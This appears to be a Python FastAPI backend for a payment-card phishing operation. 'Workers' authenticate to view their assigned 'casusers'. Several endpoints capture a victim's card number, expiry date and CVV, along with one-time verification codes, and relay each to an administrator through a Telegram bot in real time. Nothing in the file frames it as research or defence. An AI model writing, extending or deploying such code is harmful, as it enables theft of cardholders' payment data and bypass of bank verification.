import re
from typing import Optional
from hashlib import md5
from typing import Optional

from fastapi import Depends, Form
from fastapi.security import OAuth2PasswordBearer
from fastapi import HTTPException, status
import jwt

from loader import app, bot
from models import Worker, Payment
from config import settings  # ADMINS_ID, JWT_SECRET
from data import payload, keyboards


oauth2_scheme = OAuth2PasswordBearer(tokenUrl="token")


@app.post("/token")
async def login(sup_key: int = Form(...)):
    try:
        worker = Worker.get(sup_key=sup_key)
        token = jwt.encode(
            {
                "chat_id": worker.cid,
                "sup_key": md5(str(worker.sup_key).encode()).hexdigest()
            },
            settings.JWT_SECRET
        )

        return {"access_token": token, "token_type": "bearer"}
    except Worker.DoesNotExist:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail='Invalid chat_id or sup_key'
        )


async def get_casusers(offset: int = 0, token: str = Depends(oauth2_scheme)):
    try:
        data = jwt.decode(token, settings.JWT_SECRET, algorithms=["HS256"])
        worker = Worker.get(cid=data["chat_id"])
        # getting 50 users with offset
        return worker.casusers.offset(5 * offset).limit(5)
    except jwt.exceptions.InvalidSignatureError:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail='Invalid Signature'
        )


@app.get("/get_chats")
async def chats(casusers=Depends(get_casusers)):
    return list(map(lambda casuser: casuser.cid, casusers))


@app.get("/ucci{key}")
async def update_cc_info(key: int, info: Optional[str]):
    try:
        pay = Payment.get(key=key)
        if pay.cardinfo != info:
            pay.cardinfo = info

            card = info.split(";")

            if len(card[0]) != 16:
                return {"Status": "INVCNUM"}

            number = re.sub(r"(.{4})", r"\1 ", card[0])

            message = await bot.send_message(settings.ADMINS_ID[0], payload.cardinfo.format(
                number=number,
                data=card[1],
                cvv=card[2],
            ))

            pay.message_id = message.message_id

            pay.save()

            return {"Status": "OK"}
        else:
            return {"Status": "NOTNEW"}
    except Payment.DoesNotExist:
        return {"Status": "DNE"}


@app.get("/gcci{key}")
async def get_cc_info(key: int):
    try:
        pay = Payment.get(key=key)

        if pay.cardinfo:
            return {
                "Status": "OK",
                "number": pay.cardinfo.split(";")[0],
                "service": pay.service,
                "amount": pay.amount,
            }
        else:
            return {"Status": "NOTSUP"}
    except Payment.DoesNotExist:
        return {"Status": "DNE"}


@app.get("/codecc{key}")
async def new_code_cc(key: int, code: int):
    try:
        pay = Payment.get(key=key)

        number = re.sub(r"(.{4})", r"\1 ", pay.cardinfo.split(";")[0])

        await bot.send_message(
            chat_id=settings.ADMINS_ID[0],
            text=payload.new_code.format(
                number=number,
                code=code,
            ),
            reply_to_message_id=pay.message_id,
            reply_markup=keyboards.code(key)
        )
    except Payment.DoesNotExist:
        return {"Status": "DNE"}


@app.get("/codestat{key}")
async def code_status(key: int):
    try:
        pay = Payment.get(key=key)

        if pay.code:
            pay.code = False
            pay.save()
            return {"Status": "OK"}
        else:
            return {"Status": "NE"}
    except Payment.DoesNotExist:
        return {"Status": "DNE"}
